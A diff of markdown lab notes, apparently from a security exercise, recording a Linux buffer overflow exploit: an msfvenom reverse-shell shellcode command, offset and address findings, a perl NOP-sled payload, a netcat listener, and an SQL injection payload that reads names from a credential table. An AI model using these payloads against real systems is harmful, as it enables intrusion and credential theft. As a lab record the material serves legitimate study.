@@ -79,15 +79,6 @@ sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b 
 ### 2023-01-30
 * Original metasploit shell code linux/x86/shell_reverse_tcp is missing an exit code
 
-```sh
-xcd\x80
-```
-
-* Netcat from other (attacker) terminal needs to be turned on for shellcode to work.
-```sh
-nc -lvp 80
-
-
 ### 2023-01-31
 * By using BOF pattern generator discovered return address offset is **44**.
 
@@ -99,7 +90,14 @@ nc -lvp 80
     * Beginning of buffer is 0xbffff190
     * Beginning of buffer is \x90\xf1\xff\xff\xbf
 
+```sh
+xcd\x80
+```
 
+* Netcat from other (attacker) terminal needs to be turned on for shellcode to work.
+```sh
+nc -lvp 80
+```
 
 * Before return address
 ```sh
@@ -164,8 +162,7 @@ perl -e 'print "\x90"x44,"\xd0\xf1\xff\xbf"x1,"\x90"x4,"\x31\xc0\x50\x68//sh\x68
     VALUES 
     (‘exploit', 0, 0, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ), 5, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ) ); -- ;
     ```
-    * Input into <kbd>Asc or Dsc</kbd> Input Tex
-t
+    * Input into <kbd>Asc or Dsc</kbd> Input Text
     ```sql
     exploit', 0, 0, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ), 5, ( SELECT Name from credential WHERE Id=(SELECT getNewestUserId() ) ) ); -- ;
     ```
